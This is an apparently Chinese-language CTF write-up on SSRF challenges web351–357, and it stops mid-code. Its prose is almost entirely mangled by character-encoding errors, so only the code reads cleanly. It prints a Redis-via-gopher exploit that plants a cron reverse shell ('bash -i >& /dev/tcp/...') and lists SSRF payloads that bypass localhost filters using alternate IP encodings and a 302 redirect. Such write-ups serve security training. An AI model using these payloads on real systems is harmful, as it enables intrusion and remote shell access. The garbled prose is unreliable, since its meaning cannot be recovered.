<strong>‰º†ÂèÇ</strong>ÊòØÂÜÖÁΩëÊñá‰ª∂ÁöÑÊó∂ÂÄôÔºå‰ºöÂÖàÂéªÂêßËøô‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπËØªÂá∫Êù•ÂÜçÂÜôÂÖ•ÔºåÂØºËá¥‰∫Ü‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºå‰πüÂ∞±ÊòØ‰ø°ÊÅØÊ≥ÑÈú≤ÁöÑ‰∏ÄÁßç„ÄÇ‰∏ÄËà¨ËøôÁßçÊîªÂáª‰πü‰∏éÁõÆÂΩïÈÅçÂéÜÁõ∏ÁªìÂêà„ÄÇ</li></ul><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><strong>fsockopen()</strong></h5><ul><li><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>Áî®‰∫éÊâìÂºÄ‰∏Ä‰∏™ÁΩëÁªúËøûÊé•ÊàñËÄÖ‰∏Ä‰∏™ Unix Â•óÊé•Â≠óËøûÊé•ÔºåÂàùÂßãÂåñ‰∏Ä‰∏™Â•óÊé•Â≠óËøûÊé•Âà∞ÊåáÂÆö‰∏ªÊú∫ÔºàhostnameÔºâÔºåÂÆûÁé∞ÂØπÁî®Êà∑ÊåáÂÆö url Êï∞ÊçÆÁöÑËé∑Âèñ„ÄÇËØ•ÂáΩÊï∞‰ºö‰ΩøÁî® socket Ë∑üÊúçÂä°Âô®Âª∫Á´ã tcp ËøûÊé•ÔºåËøõË°å‰º†ËæìÂéüÂßãÊï∞ÊçÆ„ÄÇ fsockopen() Â∞ÜËøîÂõû‰∏Ä‰∏™Êñá‰ª∂Âè•ÊüÑÔºå‰πãÂêéÂèØ‰ª•Ë¢´ÂÖ∂‰ªñÊñá‰ª∂Á±ªÂáΩÊï∞Ë∞ÉÁî®<code>Ôºà‰æãÂ¶ÇÔºöfgets()Ôºåfgetss()Ôºåfwrite()Ôºåfclose()ËøòÊúâfeof()Ôºâ</code>Â¶ÇÊûúË∞ÉÁî®Â§±Ë¥•ÔºåÂ∞ÜËøîÂõûfalse„ÄÇ</li></ul><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h5><ul><li>curl_init(url) ÂáΩÊï∞ÂàùÂßãÂåñ‰∏Ä‰∏™Êñ∞ÁöÑ‰ºöËØùÔºåËøîÂõû‰∏Ä‰∏™ cURL Âè•ÊüÑÔºå‰æõ<code>curl_setopt()Ôºåcurl_exec()Âíåcurl_close()</code>ÂáΩÊï∞‰ΩøÁî®„ÄÇ</li></ul><h5 id="file-ÂçèËÆÆÁöÑÂà©Áî®"><a href="#file-ÂçèËÆÆÁöÑÂà©Áî®" class="headerlink" title="file ÂçèËÆÆÁöÑÂà©Áî®"></a><strong>file ÂçèËÆÆÁöÑÂà©Áî®</strong></h5><pre class="language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/password  # file:// ‰πãÂêéÂèØ‰ª•Êé•‰ªªÊÑèÊñá‰ª∂</span></code></pre><h5 id="dict-ÂçèËÆÆÁöÑ‰ΩøÁî®"><a href="#dict-ÂçèËÆÆÁöÑ‰ΩøÁî®" class="headerlink" title="dict ÂçèËÆÆÁöÑ‰ΩøÁî®"></a><strong>dict ÂçèËÆÆÁöÑ‰ΩøÁî®</strong></h5><pre class="language-php" data-language="php"><code class="language-php">Âà©Áî®dictÂçèËÆÆÔºådict<span class="token punctuation">:</span><span class="token comment">//ip/info ÂèØËé∑ÂèñÊú¨Âú∞redisÊúçÂä°ÈÖçÁΩÆ‰ø°ÊÅØ„ÄÇ</span></code></pre><h5 id="gopher-ÂçèËÆÆÁöÑ‰ΩøÁî®"><a href="#gopher-ÂçèËÆÆÁöÑ‰ΩøÁî®" class="headerlink" title="gopher ÂçèËÆÆÁöÑ‰ΩøÁî®"></a><strong>gopher ÂçèËÆÆÁöÑ‰ΩøÁî®</strong></h5><p>È¶ñÂÖàÂÖà‰∫ÜËß£‰∏Ä‰∏ãÈÄöÂ∏∏ÊîªÂáª Redis ÁöÑÂëΩ‰ª§ÔºåÁÑ∂ÂêéËΩ¨Âåñ‰∏∫ Gopher ÂèØÁî®ÁöÑÂçèËÆÆ</p><pre class="language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> flushall<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token operator">|</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> <span class="token number">1</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> dbfilename rootredis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> save//redis-cliÊü•ÁúãÊâÄÊúâÁöÑkeysÂèäÊ∏ÖÁ©∫ÊâÄÊúâÁöÑÊï∞ÊçÆ</code></pre><p>Ëøô‰æøÊòØÂ∏∏ËßÅÁöÑexpÔºåÂè™ÈúÄËá™Â∑±Êõ¥ÊîπIPÂíåÁ´ØÂè£Âç≥ÂèØÔºåÊîπÊàêÈÄÇÈÖç‰∫é<code>Gopher</code>ÂçèËÆÆÁöÑ URLÔºö</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span></code></pre><p>ÁªèËøáurlËß£Á†Å‰æøÊòØÔºö</p><pre class="language-bash" data-language="bash"><code class="language-bash">gopher://127.0.0.1:6379/_*1 <span class="token variable">$8</span> flushall *3 <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> <span class="token number">1</span> <span class="token variable">$64</span> */1 * * * * <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/127.0.0.1/45952 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span> *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$3</span> <span class="token function">dir</span> <span class="token variable">$16</span> /var/www/html/ *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$10</span> dbfilename <span class="token variable">$4</span> root *1 <span class="token variable">$4</span> save quit</code></pre><h3 id="web351-360"><a href="#web351-360" class="headerlink" title="web351-360"></a>web351-360</h3><h4 id="web351-curl-exec"><a href="#web351-curl-exec" class="headerlink" title="web351(curl_exec)"></a>web351(curl_exec)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><ol><li><code>$ch=curl_init($url);</code>ÔºöËøôË°å‰ª£Á†ÅÂàùÂßãÂåñcURL‰ºöËØùÔºåÂπ∂Â∞ÜÂèòÈáè<code>$url</code>‰Ωú‰∏∫Ë¶ÅËØ∑Ê±ÇÁöÑURL„ÄÇ</li><li><code>curl_setopt($ch, CURLOPT_HEADER, 0);</code>ÔºöËÆæÁΩÆcURLÈÄâÈ°πÔºåÂëäËØâcURL‰∏çË¶ÅÂú®ËæìÂá∫‰∏≠ÂåÖÂê´HTTPÂ§¥‰ø°ÊÅØ„ÄÇ</li><li><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>ÔºöËÆæÁΩÆcURLÈÄâÈ°πÔºå‰ΩøÂæóÊâßË°å<code>curl_exec</code>ÂêéËøîÂõûÁöÑ‰∏çÊòØÁõ¥Êé•ËæìÂá∫ÔºåËÄåÊòØÂ∞ÜÁªìÊûú‰Ωú‰∏∫Â≠óÁ¨¶‰∏≤ËøîÂõû„ÄÇ</li><li><code>$result=curl_exec($ch);</code>ÔºöÊâßË°åcURL‰ºöËØùÔºåÂπ∂Ëé∑ÂèñÁªìÊûúÔºåÂ≠òÂÇ®Âú®ÂèòÈáè<code>$result</code>‰∏≠„ÄÇ</li><li><code>curl_close($ch);</code>ÔºöÂÖ≥Èó≠cURL‰ºöËØùÔºåÈáäÊîæËµÑÊ∫ê„ÄÇ</li></ol><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//localhost/flag.php</span>  url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///var/www/html/flag.php</span></code></pre><h4 id="web352-localhost-127-0-0-1ÁªïËøá"><a href="#web352-localhost-127-0-0-1ÁªïËøá" class="headerlink" title="web352(localhost|127.0.0.1ÁªïËøá)"></a>web352(localhost|127.0.0.1ÁªïËøá)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> hacker</code></pre><p>ÂæóÊúâ<code>http|https</code>‰ΩÜÊòØban‰∫Ü<code>localhost|127.0.0</code>(ÂπΩÈªòËøáÊª§ÔºåÂêéÈù¢Ê≤°Êúâ1ÔºåÊâÄ‰ª•‰πãÂâçpayload‰πüÂèØ‰ª•)</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">ÂçÅÂÖ≠ËøõÂà∂url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F.0.0.1/flag.php</span>ÂÖ´ËøõÂà∂url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0177.0.0.1/flag.php</span><span class="token number">10</span> ËøõÂà∂Êï¥Êï∞Ê†ºÂºèurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2130706433/flag.php</span><span class="token number">16</span> ËøõÂà∂Êï¥Êï∞Ê†ºÂºèÔºåËøòÊòØ‰∏äÈù¢ÈÇ£‰∏™ÁΩëÁ´ôËΩ¨Êç¢ËÆ∞ÂæóÂâçÁºÄ<span class="token number">0</span>xurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F000001/flag.php</span>ËøòÊúâ‰∏ÄÁßçÁâπÊÆäÁöÑÁúÅÁï•Ê®°Âºè<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>ÂÜôÊàê<span class="token number">127.1</span>Áî®<span class="token constant">CIDR</span>ÁªïËøálocalhosturl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.127.127.127/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0.0.0.0/flag.php</span>payloadÔºöurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><p>Ë°•ÂÖÖ‰∏ÄÁÇπ</p><p><code>parse_url</code> ÊòØ PHP ‰∏≠ÁöÑ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÁî®‰∫éËß£Êûê‰∏Ä‰∏™ URL Âπ∂ËøîÂõûÂÖ∂ÁªÑÊàêÈÉ®ÂàÜ‰Ωú‰∏∫Êï∞ÁªÑ„ÄÇËøô‰∏™ÂáΩÊï∞ÈùûÂ∏∏ÈÄÇÁî®‰∫éÈúÄË¶Å‰ªé URL ‰∏≠ÊèêÂèñÂçèËÆÆ„ÄÅ‰∏ªÊú∫Âêç„ÄÅË∑ØÂæÑÁ≠â‰ø°ÊÅØÁöÑÂú∫ÊôØ„ÄÇ</p><p><strong>ÂáΩÊï∞ÂéüÂûã</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$component</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span></code></pre><p><strong>ÂèÇÊï∞</strong></p><ul><li><p><code>$url</code>ÔºöÈúÄË¶ÅËß£ÊûêÁöÑ URL Â≠óÁ¨¶‰∏≤„ÄÇ</p></li><li><p><code>$component</code>ÔºàÂèØÈÄâÔºâÔºöÊåáÂÆöËøîÂõû URL ÁöÑÂì™‰∏™ÈÉ®ÂàÜ„ÄÇÂèØ‰ª•ÊòØ‰ª•‰∏ãÂ∏∏Èáè‰πã‰∏ÄÔºö</p><ul><li><code>PHP_URL_SCHEME</code>ÔºöËøîÂõû URL ÁöÑÂçèËÆÆÈÉ®ÂàÜÔºàÂ¶Ç <code>http</code>, <code>https</code>Ôºâ„ÄÇ</li><li><code>PHP_URL_HOST</code>ÔºöËøîÂõû URL ÁöÑ‰∏ªÊú∫ÈÉ®ÂàÜÔºàÂ¶Ç <code>www.example.com</code>Ôºâ„ÄÇ</li><li><code>PHP_URL_PORT</code>ÔºöËøîÂõû URL ÁöÑÁ´ØÂè£ÈÉ®ÂàÜÔºàÂ¶ÇÊûúÂ≠òÂú®Ôºâ„ÄÇ</li><li><code>PHP_URL_USER</code>ÔºöËøîÂõû URL ÁöÑÁî®Êà∑ÂêçÈÉ®ÂàÜÔºàÂ¶ÇÊûúÂ≠òÂú®Ôºâ„ÄÇ</li><li><code>PHP_URL_PASS</code>ÔºöËøîÂõû URL ÁöÑÂØÜÁ†ÅÈÉ®ÂàÜÔºàÂ¶ÇÊûúÂ≠òÂú®Ôºâ„ÄÇ</li><li><code>PHP_URL_PATH</code>ÔºöËøîÂõû URL ÁöÑË∑ØÂæÑÈÉ®ÂàÜÔºàÂ¶Ç <code>/path/to/resource</code>Ôºâ„ÄÇ</li><li><code>PHP_URL_QUERY</code>ÔºöËøîÂõû URL ÁöÑÊü•ËØ¢Â≠óÁ¨¶‰∏≤ÈÉ®ÂàÜÔºàÂ¶ÇÊûúÂ≠òÂú®Ôºâ„ÄÇ</li><li><code>PHP_URL_FRAGMENT</code>ÔºöËøîÂõû URL ÁöÑÁâáÊÆµÊ†áËØÜÁ¨¶ÈÉ®ÂàÜÔºàÂ¶ÇÊûúÂ≠òÂú®Ôºâ„ÄÇ</li></ul><p>Â¶ÇÊûúÁúÅÁï•Ê≠§ÂèÇÊï∞ÊàñËÆæÁΩÆ‰∏∫ <code>-1</code>Ôºå<code>parse_url</code> Â∞ÜËøîÂõûÂåÖÂê´ÊâÄÊúâÈÉ®ÂàÜÁöÑÊï∞ÁªÑ„ÄÇ</p></li></ul><p><strong>ËøîÂõûÂÄº</strong></p><ul><li>Â¶ÇÊûúÊàêÂäüÔºåËøîÂõû‰∏Ä‰∏™Êï∞ÁªÑÔºåÂåÖÊã¨ URL ÁöÑÂêÑ‰∏™ÁªÑÊàêÈÉ®ÂàÜ„ÄÇ</li><li>Â¶ÇÊûú URL Ê†ºÂºè‰∏çÊ≠£Á°ÆÊàñÊó†Ê≥ïËß£ÊûêÔºåËøîÂõû <code>false</code>„ÄÇ</li></ul><h4 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\„ÄÇ/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Â§öËøáÊª§‰∫ÜÂè•Âè∑Ôºå‰∏äÈ¢òPayload‰πüÂèØ‰ª•</p><h4 id="web354-Ëß£ÊûêÂüüÂêç"><a href="#web354-Ëß£ÊûêÂüüÂêç" class="headerlink" title="web354(Ëß£ÊûêÂüüÂêç)"></a>web354(Ëß£ÊûêÂüüÂêç)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|1|0|„ÄÇ/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>1Âíå0ËøáÊª§‰∫Ü</p><p>302Ë∑≥ËΩ¨ÔºåvpsÊê≠‰∏Ä‰∏™ :</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>POST: url&#x3D;<a href="http://your-domain/ssrf/302.php">http://your-domain/ssrf/302.php</a><br>Y4Â∏àÂÇÖÊâæÂà∞‰∏Ä‰∏™AËÆ∞ÂΩïÊòØ127.0.0.1ÁöÑÁΩëÁ´ô: <a href="http://sudo.cc/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%94%A8%E8%A7%A3%E6%9E%90%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%86">http://sudo.cc/ÔºåÂèØ‰ª•‰∏çÁî®Ëß£ÊûêËá™Â∑±ÁöÑ‰∫Ü</a><br>payload:url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><h4 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>Ê≤°ÊúâÂÅöÂÖ∂‰ªñËøáÊª§Ôºå‰ΩÜÈôêÂà∂‰∫Ü<code>host</code>ÁöÑÈïøÂ∫¶</p><p>0Âú®linuxÁ≥ªÁªü‰∏≠‰ºöËß£ÊûêÊàê127.0.0.1Âú®windows‰∏≠Ëß£ÊûêÊàê0.0.0.0</p><p>PayloadÔºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><h4 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span></code></pre><h4 id="web357-ÈáçÂÆöÂêë"><a href="#web357-ÈáçÂÆöÂêë" class="headerlink" title="web357(ÈáçÂÆöÂêë)"></a>web357(ÈáçÂÆöÂêë)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token 